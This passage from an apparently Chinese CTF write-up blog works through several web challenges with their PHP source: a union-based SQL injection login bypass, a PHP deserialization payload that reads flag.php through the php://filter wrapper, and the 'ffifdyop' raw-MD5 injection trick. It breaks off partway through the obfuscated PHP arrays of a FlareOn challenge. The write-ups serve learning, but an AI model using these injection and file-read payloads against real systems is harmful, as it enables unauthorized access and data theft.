class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;$name&#x27;</span><br></code></pre></td></tr></table></figure><p>但是还是没有思路。因为根本绕不过。肯定还有别的校验。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;<br>&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; <br>&lt;title&gt;Do you know who am I?&lt;/title&gt;<br>&lt;?php<br>require &quot;config.php&quot;;<br>require &quot;flag.php&quot;;<br><br>// 去除转义<br>if (get_magic_quotes_gpc()) &#123;<br>function stripslashes_deep($value)<br>&#123;<br>$value = is_array($value) ?<br>array_map(&#x27;stripslashes_deep&#x27;, $value) :<br>stripslashes($value);<br>return $value;<br>&#125;<br><br>$_POST = array_map(&#x27;stripslashes_deep&#x27;, $_POST);<br>$_GET = array_map(&#x27;stripslashes_deep&#x27;, $_GET);<br>$_COOKIE = array_map(&#x27;stripslashes_deep&#x27;, $_COOKIE);<br>$_REQUEST = array_map(&#x27;stripslashes_deep&#x27;, $_REQUEST);<br>&#125;<br><br>mysqli_query($con,&#x27;SET NAMES UTF8&#x27;);<br>$name = $_POST[&#x27;name&#x27;];<br>$password = $_POST[&#x27;pw&#x27;];<br>$t_pw = md5($password);<br>$sql = &quot;select * from user where username = &#x27;&quot;.$name.&quot;&#x27;&quot;;<br>// echo $sql;<br>$result = mysqli_query($con, $sql);<br><br><br>if(preg_match(&quot;/\(|\)|\=|or/&quot;, $name))&#123;<br>die(&quot;do not hack me!&quot;);<br>&#125;<br>else&#123;<br>if (!$result) &#123;<br>printf(&quot;Error: %s\n&quot;, mysqli_error($con));<br>exit();<br>&#125;<br>else&#123;<br>// echo &#x27;&lt;pre&gt;&#x27;;<br>$arr = mysqli_fetch_row($result);<br>// print_r($arr);<br>if($arr[1] == &quot;admin&quot;)&#123;<br>if(md5($password) == $arr[2])&#123;<br>echo $flag;<br>&#125;<br>else&#123;<br>die(&quot;wrong pass!&quot;);<br>&#125;<br>&#125;<br>else&#123;<br>die(&quot;wrong user!&quot;);<br>&#125;<br>&#125;<br>&#125;<br><br>?&gt;<br><br></code></pre></td></tr></table></figure><p>1、在name中过滤了一些字符以及or。</p><p>2、mysqli_query（）对数据库进行一次查询</p><p>3、mysqli_fetch_row() 函数从结果集中取得一行，并作为枚举数组返回。<br>4、md5加密后要与数组arr[2]弱类型比较。</p><p>5、值得注意的一点<code>$result = mysqli_query($con, $sql);</code>这里必须是有一个sql的查询语句，不然会直接退出（由下方判断得出）。</p><p>6、这里不是很能理解sql语句<code>$sql = &quot;select * from user where username = &#39;&quot;.$name.&quot;&#39;&quot;;</code>,拼接进去到底是什么样子的。询问了h3师傅。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220223170735.png" alt="QQ截图20220223170735"></p><p><strong><code>大爱h3</code></strong></p><p>尴尬，被教训了。我自己动手，设置的变量没有加<code>&quot;&quot;</code>,被骂的妥妥的，错了错了下次一定还敢哈哈哈哈。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220223171831.png" alt="QQ截图20220223171831"></p><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p>1、<code>name=ad&#39; union select 1,&#39;admin&#39;,NULL#&amp;pw[]=123</code></p><p>2、<code>name=ad&#39; union select 1,&#39;admin&#39;,&#39;加密后的md5&#39;#&amp;pw[]=任意待MD5加密的密码</code>（本人没有复现成功，没有具体的数据库也不能跟进查看）。</p><h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML"> &lt;?php<br><br>include(&quot;flag.php&quot;);<br><br>highlight_file(__FILE__);<br><br>class FileHandler &#123;<br><br>    protected $op;<br>    protected $filename;<br>    protected $content;<br><br>    function __construct() &#123;<br>        $op = &quot;1&quot;;<br>        $filename = &quot;/tmp/tmpfile&quot;;<br>        $content = &quot;Hello World!&quot;;<br>        $this-&gt;process();<br>    &#125;<br><br>    public function process() &#123;<br>        if($this-&gt;op == &quot;1&quot;) &#123;<br>            $this-&gt;write();<br>        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;<br>            $res = $this-&gt;read();<br>            $this-&gt;output($res);<br>        &#125; else &#123;<br>            $this-&gt;output(&quot;Bad Hacker!&quot;);<br>        &#125;<br>    &#125;<br><br>    private function write() &#123;<br>        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;<br>            if(strlen((string)$this-&gt;content) &gt; 100) &#123;<br>                $this-&gt;output(&quot;Too long!&quot;);<br>                die();<br>            &#125;<br>            $res = file_put_contents($this-&gt;filename, $this-&gt;content);<br>            if($res) $this-&gt;output(&quot;Successful!&quot;);<br>            else $this-&gt;output(&quot;Failed!&quot;);<br>        &#125; else &#123;<br>            $this-&gt;output(&quot;Failed!&quot;);<br>        &#125;<br>    &#125;<br><br>    private function read() &#123;<br>        $res = &quot;&quot;;<br>        if(isset($this-&gt;filename)) &#123;<br>            $res = file_get_contents($this-&gt;filename);<br>        &#125;<br>        return $res;<br>    &#125;<br><br>    private function output($s) &#123;<br>        echo &quot;[Result]: &lt;br&gt;&quot;;<br>        echo $s;<br>    &#125;<br><br>    function __destruct() &#123;<br>        if($this-&gt;op === &quot;2&quot;)<br>            $this-&gt;op = &quot;1&quot;;<br>        $this-&gt;content = &quot;&quot;;<br>        $this-&gt;process();<br>    &#125;<br><br>&#125;<br><br>function is_valid($s) &#123;<br>    for($i = 0; $i &lt; strlen($s); $i++)<br>        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))<br>            return false;<br>    return true;<br>&#125;<br><br>if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123;<br><br>    $str = (string)$_GET[&#x27;str&#x27;];<br>    if(is_valid($str)) &#123;<br>        $obj = unserialize($str);<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="分析代码"><a href="#分析代码" class="headerlink" title="分析代码"></a>分析代码</h3><p>一眼看到<code>unserialize</code>（大体就是考查反序列化了），然后有一个判断。<code>is_valid($str)</code>,上网找了半天，结果这是一个自建函数。emmm…无语啦。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-comment">#其功能就是限制输入的字符长度为32-125（转化为ascii后）</span><br></code></pre></td></tr></table></figure><p>然后想到魔法函数的调用。这里直接引用h3师傅的文章。copy过来。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk">__destruct()：<span class="hljs-regexp">//</span>析构函数当对象被销毁时会被自动调用<br>__wakeup(): <span class="hljs-regexp">//u</span>nserialize()时会被自动调用<br>__invoke(): <span class="hljs-regexp">//</span>当尝试以调用函数的方法调用一个对象时，会被自动调用<br>__call(): <span class="hljs-regexp">//</span>在对象上下文中调用不可访问的方法时触发<br>__callStatci(): <span class="hljs-regexp">//</span>在静态上下文中调用不可访问的方法时触发<br>__get(): <span class="hljs-regexp">//</span>用于从不可访问的属性读取数据<br>__set(): <span class="hljs-regexp">//</span>用于将数据写入不可访问的属性<br>__isset(): <span class="hljs-regexp">//</span>在不可访问的属性上调用isset()或empty()触发<br>__unset(): <span class="hljs-regexp">//</span>在不可访问的属性上使用unset()时触发<br>__toString(): <span class="hljs-regexp">//</span>把类当作字符串使用时触发<br>__construct(): <span class="hljs-regexp">//</span>构造函数，当对象new的时候会自动调用，但在unserialize()时不会自动调用<br>__sleep(): <span class="hljs-regexp">//</span>serialize()函数会检查类中是否存在一个魔术方法__sleep() 如果存在，该方法会被优先调用<br></code></pre></td></tr></table></figure><p>这里就可以直接看看<code>_destruct()</code>干了什么。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>            <span class="hljs-variable language_">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><span class="hljs-comment">#op初始值为1</span><br></code></pre></td></tr></table></figure><p>继续跟<code>process()</code>函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>     <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>         <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>();<br>     &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>         <span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>();<br>         <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-variable">$res</span>);<br>     &#125; <span class="hljs-keyword">else</span> &#123;<br>         <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>     &#125;<br> &#125;<br></code></pre></td></tr></table></figure><p>很显然需要进入<code>read()</code>函数。这里<code>output</code>，会将返回结果输出。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename)) &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable language_">$this</span>-&gt;filename);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>很显然这里就可以用php:&#x2F;&#x2F;filter伪协议读取文件。</p><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>1、需要在进入<code>process</code>之前将op的值改为2。</p><p>2、构造filenaem&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220223160637.png" alt="QQ截图20220223160637"></p><p>这里不知道什么原因。搜了一下wp。看wp的时候发现自己的伪协议写错了。emmm…手动添加<code>//</code>，并且手动改变wp。<code>55</code>–<code>57</code></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220223160814.png" alt="QQ截图20220223160814"></p><h3 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;FileHandler&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;op&quot;</span>;i:<span class="hljs-number">2</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;filename&quot;</span>;s:<span class="hljs-number">57</span>:<span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><h3 id="Base64解码"><a href="#Base64解码" class="headerlink" title="Base64解码"></a>Base64解码</h3><p>结束。</p><h2 id="SWPUCTF-2016-Web7"><a href="#SWPUCTF-2016-Web7" class="headerlink" title="[SWPUCTF 2016]Web7"></a>[SWPUCTF 2016]Web7</h2><p>这题相对来说就比较简单。简单记录一下。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220218183715.png" alt="QQ截图20220218183715"></p><p>如何绕过呢？百度一瞧。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220218183842.png" alt="QQ截图20220218183842"></p><p><strong>师傅已经讲得很详细了，总而言之就是当注入的pass&#x3D;ffifdyop时，ffifdyop经过md5加密后变成 ‘or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c 被返回， ‘ \ ‘后面的3个字符连同’ \ ‘算一个字符，比如’  \xc9 ‘，所以上述一共16个字符。函数md5($pass,true)返回为true。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220218184141.png" alt="QQ截图20220218184141"></p><p>查看源码 MD5简单绕过，然后依旧MD5简单绕过。<br>结束。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220218184328.png" alt="QQ截图20220218184328"></p><h2 id="FlareOn1-Javascrap"><a href="#FlareOn1-Javascrap" class="headerlink" title="[FlareOn1]Javascrap"></a>[FlareOn1]Javascrap</h2><p>给了压缩包直接下载一下。winhex查看图片。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$terms</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;Z&quot;</span>, <span class="hljs-string">&quot;]&quot;</span>, <span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;z&quot;</span>, <span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;)&quot;</span>, <span class="hljs-string">&quot;9&quot;</span>, <span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>, <span class="hljs-string">&quot;&amp;&quot;</span>, <span class="hljs-string">&quot;\&#x27;&quot;</span>, <span class="hljs-string">&quot;!&quot;</span>, <span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;~&quot;</span>, <span class="hljs-string">&quot;O&quot;</span>, <span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;6&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;^&quot;</span>, <span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;`&quot;</span>, <span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;[&quot;</span>, <span class="hljs-string">&quot;0&quot;</span>, <span class="hljs-string">&quot;&#125;&quot;</span>, <span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-string">&quot;&#123;&quot;</span>, <span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;o&quot;</span>, <span class="hljs-string">&quot;7&quot;</span>, <span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;I&quot;</span>, <span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-string">&quot;(&quot;</span>, <span class="hljs-string">&quot;j&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;?&quot;</span>, <span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;t&quot;</span>, <span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;|&quot;</span>);<br><span class="hljs-variable">$order</span>=<span class="hljs-keyword">array</span>(<span class="hljs-number">59</span>, <span class="hljs-number">71</span>, <span class="hljs-number">73</span>, <span class="hljs-number">13</span>, <span class="hljs-number">35</span>, <span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">81</span>, <span class="hljs-number">76</span>, <span class="hljs-number">10</span>, <span class="hljs-number">28</span>, <span class="hljs-number">63</span>, <span class="hljs-number">12</span>, <span class="hljs-number">1</span>, <span class="hljs-number">28</span>, <span class="hljs-number">11</span>, <span class="hljs-number">76</span>, <span class="hljs-number">68</span>, <span class="hljs-number">50</span>, <span class="hljs-number">30</span>, <span class="hljs-number">11</span>, <span class="hljs-number">24</span>, <span class="hljs-number">7</span>, <span class="hljs-number">63</span>, <span class="hljs-number">45</span>, <span class="hljs-number">20</span>, <span class="hljs-number">23</span>, <span class="hljs-number">68</span>, <span class="hljs-number">87</span>, <span class="hljs-number">42</span>, <span class="hljs-number">24</span>, <span class="hljs-number">60</span>, <span class="hljs-number">87</span>, <span class="hljs-number">63</span>, <span class="hljs-number">18</span>, <span class="hljs-number">58</span>, <span class="hljs-number">87</span>, <span class="hljs-number">63</span>, <span class="hljs-number">18</span>, <span class="hljs-number">58</span>, <span class="hljs-number">87</span>, <span class="hljs-number">63</span>, <span class="hljs-number">83</span>, <span class="hljs-number">43</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">90</span>, <span class="hljs-number">38</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">19</span>, <span class="hljs-number">66</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">17</span>, <span class="hljs-number">37</span>, <span class="hljs-number">63</span>, <span class="hljs-number">58</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">83</span>, <span class="hljs-number">43</span>, <span class="hljs-number">87</span>, <span class="hljs-number">42</span>, <span class="hljs-number">24</span>, <span class="hljs-number">60</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">87</span>, <span class="hljs-number">66</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">66</span>, <span class="hljs-number">63</span>, <span class="hljs-number">50</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">17</span>, <span class="hljs-number">1</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">45</span>, <span class="hljs-number">66</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">40</span>, <span class="hljs-number">11</span>, <span class="hljs-number">25</span>, <span class="hljs-number">5</span>, <span class="hljs-number">70</span>, <span class="hljs-number">63</span>, <span class="hljs-number">7</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">12</span>, <span class="hljs-number">1</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">81</span>, <span class="hljs-number">37</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">12</span>, <span class="hljs-number">63</span>, <span class="hljs-number">25</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">83</span>, <span class="hljs-number">63</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">87</span>, <span class="hljs-number">23</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">75</span>, <span class="hljs-number">49</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">49</span>, <span class="hljs-number">0</span>, <span class="hljs-number">50</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">18</span>, <span class="hljs-number">50</span>, <span class="hljs-number">87</span>, <span class="hljs-number">42</span>, <span class="hljs-number">18</span>, <span class="hljs-number">90</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">81</span>, <span class="hljs-number">40</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">40</span>, <span class="hljs-number">11</span>, <span class="hljs-number">7</span>, <span class="hljs-number">5</span>, <span class="hljs-number">70</span>, <span class="hljs-number">63</span>, <span class="hljs-number">7</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">12</span>, <span class="hljs-number">68</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">81</span>, <span class="hljs-number">7</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">66</span>, <span class="hljs-number">63</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">40</span>, <span class="hljs-number">63</span>, 